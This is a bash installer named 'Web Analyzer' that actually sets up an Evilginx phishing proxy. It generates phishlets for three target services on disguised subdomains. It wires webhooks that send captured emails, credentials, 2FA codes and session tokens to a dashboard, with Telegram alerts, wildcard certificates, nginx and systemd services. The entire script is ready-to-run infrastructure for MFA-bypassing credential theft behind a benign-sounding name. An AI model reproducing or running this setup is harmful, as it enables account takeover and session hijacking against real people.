#!/bin/bash
set -e

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'
log() { echo -e "${GREEN}[+]${NC} $1"; }
err() { echo -e "${RED}[ERROR]${NC} $1"; exit 1; }

clear
echo "============================================"
echo "     Web Analyzer Installation"
echo "============================================"
echo ""

[ "$EUID" -ne 0 ] && err "Run as root: sudo bash install.sh"

read -p "Domain: " DOMAIN
read -p "VPS IP: " VPS_IP
read -p "Telegram Bot Token: " TG_TOKEN
read -p "Telegram Chat ID: " TG_CHAT
read -p "Cloudflare API Token: " CF_TOKEN
read -sp "Admin Password (blank=auto): " ADMIN_PASS
echo ""

[ -z "$ADMIN_PASS" ] && ADMIN_PASS=$(openssl rand -base64 16 | tr -d '/+=' | cut -c1-16)
WEBHOOK_SECRET=$(openssl rand -hex 16)
ADMIN_PATH=$(openssl rand -hex 12)

# Generate endpoint names
EP1="collector-$(openssl rand -hex 4)"
EP2="tracker-$(openssl rand -hex 4)"
EP3="monitor-$(openssl rand -hex 4)"

echo ""
echo "Endpoints: https://$EP1.$DOMAIN | https://$EP2.$DOMAIN | https://$EP3.$DOMAIN"
read -p "Continue? (y/n): " -n 1 -r
echo ""
[[ ! $REPLY =~ ^[Yy]$ ]] && exit 1

log "Installing dependencies..."
apt-get update -qq && apt-get install -y -qq git curl wget nginx certbot python3-certbot-dns-cloudflare golang-go

log "Installing Evilginx..."
cd /opt
if [ ! -d "evilginx2" ]; then
    git clone https://github.com/kgretzky/evilginx2.git
fi
cd evilginx2
make build
cp build/evilginx /usr/local/bin/

log "Building Web Analyzer..."
INSTALL_DIR="/opt/webanalyzer"
mkdir -p $INSTALL_DIR/{data,logs}
cp -r cmd internal go.mod templates $INSTALL_DIR/
cd $INSTALL_DIR

go mod tidy
go build -o webanalyzer ./cmd/webanalyzer
go build -o webanalyzer-cli ./cmd/webanalyzer-cli
cp webanalyzer-cli /usr/local/bin/webanalyzer
chmod +x /usr/local/bin/webanalyzer

log "Creating configuration from templates..."
mkdir -p /opt/evilginx/{phishlets,certs}

# Create config.json
cat > $INSTALL_DIR/config.json << EOF
{
    "domain": "$DOMAIN",
    "vps_ip": "$VPS_IP",
    "telegram_token": "$TG_TOKEN",
    "telegram_chat": "$TG_CHAT",
    "admin_pass": "$ADMIN_PASS",
    "data_dir": "$INSTALL_DIR/data",
    "endpoints": {
        "service1": "$EP1",
        "service2": "$EP2",
        "service3": "$EP3"
    },
    "admin_path": "$ADMIN_PATH",
    "retention_days": 30,
    "webhook_secret": "$WEBHOOK_SECRET"
}
EOF

# Create Evilginx config from template
cat $INSTALL_DIR/templates/evilginx.yaml.tmpl | \
    sed "s/{{.Domain}}/$DOMAIN/g" > /opt/evilginx/config.yaml

# Create phishlets from templates
for i in 1 2 3; do
    cat $INSTALL_DIR/templates/phishlets/service${i}.yaml.tmpl | \
        sed "s/{{.Endpoint${i}}}/$(eval echo \$EP${i})/g" > /opt/evilginx/phishlets/service${i}.yaml
done

# Add webhook configuration to each phishlet
for i in 1 2 3; do
    cat >> /opt/evilginx/phishlets/service${i}.yaml << EOF

webhook:
  url: "http://127.0.0.1:8080/api/webhook"
  headers:
    X-Webhook-Secret: "$WEBHOOK_SECRET"
  format: "json"
  events: ["email", "credentials", "2fa", "session"]
EOF
done

log "Setting up SSL..."
mkdir -p ~/.secrets
cat > ~/.secrets/cloudflare.ini << EOF
dns_cloudflare_api_token = $CF_TOKEN
EOF
chmod 600 ~/.secrets/cloudflare.ini

certbot certonly --dns-cloudflare --dns-cloudflare-credentials ~/.secrets/cloudflare.ini \
    -d "$DOMAIN" -d "*.$DOMAIN" --non-interactive --agree-tos --register-unsafely-without-email

log "Configuring Nginx..."
cat > /etc/nginx/sites-available/webanalyzer << EOF
server {
    listen 80;
    server_name $DOMAIN *.$DOMAIN;
    return 301 https://\$server_name\$request_uri;
}

server {
    listen 443 ssl http2;
    server_name $DOMAIN;
    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
    }
    
    location /ws {
        proxy_pass http://127.0.0.1:8080/ws;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}

server {
    listen 443 ssl http2;
    server_name ~^(collector|tracker|monitor)-.+\.$DOMAIN$;
    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    
    location / {
        proxy_pass https://127.0.0.1:8443;
        proxy_ssl_verify off;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_redirect off;
        proxy_buffering off;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
EOF

ln -sf /etc/nginx/sites-available/webanalyzer /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl start nginx && systemctl enable nginx && systemctl reload nginx

log "Creating systemd services..."
cat > /etc/systemd/system/webanalyzer.service << EOF
[Unit]
Description=Web Analyzer Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR
ExecStart=$INSTALL_DIR/webanalyzer -config $INSTALL_DIR/config.json
Restart=always
RestartSec=5
StandardOutput=append:$INSTALL_DIR/logs/webanalyzer.log
StandardError=append:$INSTALL_DIR/logs/webanalyzer.log

[Install]
WantedBy=multi-user.target
EOF

cat > /etc/systemd/system/evilginx.service << EOF
[Unit]
Description=Evilginx Proxy
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/evilginx
ExecStart=/usr/local/bin/evilginx -c /opt/evilginx/config.yaml
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable webanalyzer evilginx nginx
systemctl start webanalyzer evilginx

sleep 3

clear
echo ""
echo "============================================"
echo "     Installation Complete"
echo "============================================"
echo ""
echo "Dashboard: https://$DOMAIN/$ADMIN_PATH"
echo "Username: admin"
echo "Password: $ADMIN_PASS"
echo ""
echo "Endpoints:"
echo "  1: https://$EP1.$DOMAIN"
echo "  2: https://$EP2.$DOMAIN"
echo "  3: https://$EP3.$DOMAIN"
echo ""
echo "Commands:"
echo "  webanalyzer status"
echo "  webanalyzer stats"
echo "  webanalyzer urls"
echo "  webanalyzer sources list"
echo "  webanalyzer export all"
echo "  journalctl -u webanalyzer -f"
echo "============================================"